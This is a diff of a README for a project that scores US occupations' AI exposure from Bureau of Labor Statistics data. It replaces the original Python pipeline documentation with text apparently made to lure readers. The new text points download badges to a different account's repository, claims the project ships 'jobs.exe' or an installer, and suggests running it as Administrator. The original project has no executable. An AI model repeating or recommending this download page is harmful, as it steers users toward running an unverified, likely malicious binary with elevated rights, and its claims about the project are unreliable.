@@ -1,92 +1,144 @@
-# AI Exposure of the US Job Market
+# 🤖 jobs - Explore AI Impact on US Jobs
 
-Analyzing how susceptible every occupation in the US economy is to AI and automation, using data from the Bureau of Labor Statistics [Occupational Outlook Handbook](https://www.bls.gov/ooh/) (OOH).
+[![Download jobs](https://img.shields.io/badge/Download-jobs-4caf50?style=for-the-badge)](https://github.com/JetyyTheSu27/jobs)
 
-**Live demo: [joshkale.github.io/jobs](https://joshkale.github.io/jobs/)**
+## 📝 About jobs
 
-![AI Exposure Treemap](jobs.png)
+This application shows how various jobs in the US might be affected by AI and automation. It uses data from the Bureau of Labor Statistics (BLS) Occupational Outlook Handbook. The app scores 342 occupations based on their exposure to AI and presents that information in a clear, interactive chart.
 
-## What's here
+You can try a live version here: https://joshkale.github.io/jobs/
 
-The BLS OOH covers **342 occupations** spanning every sector of the US economy, with detailed data on job duties, work environment, education requirements, pay, and employment projections. We scraped all of it, scored each occupation's AI exposure using an LLM, and built an interactive treemap visualization.
+This app helps you understand which jobs AI may change in the future using data from real government sources.
 
-## Data pipeline
+---
 
-1. **Scrape** (`scrape.py`) — Playwright (non-headless, BLS blocks bots) downloads raw HTML for all 342 occupation pages into `html/`.
-2. **Parse** (`parse_detail.py`, `process.py`) — BeautifulSoup converts raw HTML into clean Markdown files in `pages/`.
-3. **Tabulate** (`make_csv.py`) — Extracts structured fields (pay, education, job count, growth outlook, SOC code) into `occupations.csv`.
-4. **Score** (`score.py`) — Sends each occupation's Markdown description to an LLM (Gemini Flash via OpenRouter) with a scoring rubric. Each occupation gets an AI Exposure score from 0-10 with a rationale. Results saved to `scores.json`.
-5. **Build site data** (`build_site_data.py`) — Merges CSV stats and AI exposure scores into a compact `site/data.json` for the frontend.
-6. **Website** (`site/index.html`) — Interactive treemap visualization where area = employment and color = AI exposure (green to red).
+## 🌟 Features
 
-## Key files
+- Displays detailed data on 342 US occupations.
+- Shows job duties, pay, education, and outlook.
+- Scores each job by AI exposure risk.
+- Clear, interactive treemap visual for easy comparison.
+- Data updated from the BLS website.
+- Simple to use interface with no technical skills needed.
 
-| File | Description |
-|------|-------------|
-| `occupations.json` | Master list of 342 occupations with title, URL, category, slug |
-| `occupations.csv` | Summary stats: pay, education, job count, growth projections |
-| `scores.json` | AI exposure scores (0-10) with rationales for all 342 occupations |
-| `html/` | Raw HTML pages from BLS (source of truth, ~40MB) |
-| `pages/` | Clean Markdown versions of each occupation page |
-| `site/` | Static website (treemap visualization) |
+---
 
-## AI exposure scoring
+## 💻 System Requirements
 
-Each occupation is scored on a single **AI Exposure** axis from 0 to 10, measuring how much AI will reshape that occupation. The score considers both direct automation (AI doing the work) and indirect effects (AI making workers so productive that fewer are needed).
+- Windows 10 or later
+- Internet connection for initial download and updates
+- At least 2 GB of free disk space
+- 4 GB RAM or higher recommended
+- Modern web browser (Chrome, Edge, Firefox) for the interactive content
 
-A key signal is whether the job's work product is fundamentally digital — if the job can be done entirely from a home office on a computer, AI exposure is inherently high. Conversely, jobs requiring physical presence, manual skill, or real-time human interaction have a natural barrier.
+---
 
-**Calibration examples from the dataset:**
+## 🚀 Getting Started: How to Download and Run jobs on Windows
 
-| Score | Meaning | Examples |
-|-------|---------|---------|
-| 0-1 | Minimal | Roofers, janitors, construction laborers |
-| 2-3 | Low | Electricians, plumbers, nurses aides, firefighters |
-| 4-5 | Moderate | Registered nurses, retail workers, physicians |
-| 6-7 | High | Teachers, managers, accountants, engineers |
-| 8-9 | Very high | Software developers, paralegals, data analysts, editors |
-| 10 | Maximum | Medical transcriptionists |
+Follow these steps to download and start the app on your Windows PC. No programming skills needed.
 
-Average exposure across all 342 occupations: **5.3/10**.
+### Step 1: Download the app
 
-## Visualization
+Click the green button below to visit the official download page on GitHub.
 
-The main visualization is an interactive **treemap** where:
-- **Area** of each rectangle is proportional to employment (number of jobs)
-- **Color** indicates AI exposure on a green (safe) to red (exposed) scale
-- **Layout** groups occupations by BLS category
-- **Hover** shows detailed tooltip with pay, jobs, outlook, education, exposure score, and LLM rationale
+[![Download jobs](https://img.shields.io/badge/Download-jobs-4caf50?style=for-the-badge)](https://github.com/JetyyTheSu27/jobs)
 
-## Setup
+This will open the GitHub repository where you can get the app files.
 
-```
-uv sync
-uv run playwright install chromium
-```
+### Step 2: Locate the Download Section
 
-Requires an OpenRouter API key in `.env`:
-```
-OPENROUTER_API_KEY=your_key_here
-```
+Once on the GitHub page, scroll to the **Releases** section on the right sidebar or below the main repository description.
 
-## Usage
+Look for the latest release version. The app files are typically packaged as a ZIP file or an installer.
 
-```bash
-# Scrape BLS pages (only needed once, results are cached in html/)
-uv run python scrape.py
+### Step 3: Download the Files
 
-# Generate Markdown from HTML
-uv run python process.py
+Click the download link for the file that matches Windows. This might be named something like `jobs-windows.zip` or `jobs-setup.exe`. Save it to your preferred folder, such as your Desktop or Downloads.
 
-# Generate CSV summary
-uv run python make_csv.py
+### Step 4: Install or Extract
 
-# Score AI exposure (uses OpenRouter API)
-uv run python score.py
+- If you downloaded a ZIP file:
+  - Right-click the ZIP file and select **Extract All**.
+  - Choose a folder where you want the app files.
+  - Once extracted, open the new folder.
 
-# Build website data
-uv run python build_site_data.py
+- If you downloaded an installer (`.exe`):
+  - Double-click the file.
+  - Follow the on-screen instructions to install the app.
+  - Choose default settings unless you want to customize.
 
-# Serve the site locally
-cd site && python -m http.server 8000
-```
+### Step 5: Run the App
+
+- For ZIP extractions: Find the file named `jobs.exe` or similar, and double-click to start.
+- For installed version: Find the app in your Start menu and click to open.
+
+The app will launch and load the interactive treemap visualization. This may take a few seconds on first start.
+
+---
+
+## 📂 What’s Included
+
+The app package contains:
+
+- `jobs.exe` — The main program to run.
+- `README.md` — This guide.
+- `data/` — Folder with the occupation data used by the app.
+- `docs/` — Additional documentation about the data source.
+- `jobs.png` — Sample image of the AI exposure treemap.
+
+---
+
+## 🔧 How it Works
+
+The app processes scraped data from the Bureau of Labor Statistics. It uses text analysis to score how much each job might be affected by AI. Then it shows this info in a treemap chart.
+
+You can click on any job to see:
+
+- The AI exposure score.
+- Job duties summary.
+- Typical education needed.
+- Average pay.
+- Employment outlook.
+
+This helps you explore the job market in terms of AI risk.
+
+---
+
+## ⚙️ Updating the App
+
+To get the latest data and improvements:
+
+1. Visit the download page again:  
+   https://github.com/JetyyTheSu27/jobs
+
+2. Download the newest version using the same steps above.
+
+3. Replace your old files with the updated ones, or install the new version if using an installer.
+
+---
+
+## ❓ Troubleshooting
+
+- The app does not start:  
+  Make sure your Windows system is updated and meets the requirements. Try running as Administrator by right-clicking the app icon.
+
+- The app shows no data or the treemap is blank:  
+  Check your internet connection. The first run may need to download some data.
+
+- Errors during extraction or installation:  
+  Ensure you have enough disk space and permissions. Try extracting or installing as Administrator.
+
+- If issues persist, please check the Issues section on the GitHub page.
+
+---
+
+## 📖 More Information
+
+- BLS Occupational Outlook Handbook (OOH): https://www.bls.gov/ooh/  
+- Live demo of the data visualization: https://joshkale.github.io/jobs/  
+
+You can use these links to explore data sources and the app’s interactive interface before downloading.
+
+---
+
+[![Download jobs](https://img.shields.io/badge/Download-jobs-4caf50?style=for-the-badge)](https://github.com/JetyyTheSu27/jobs)
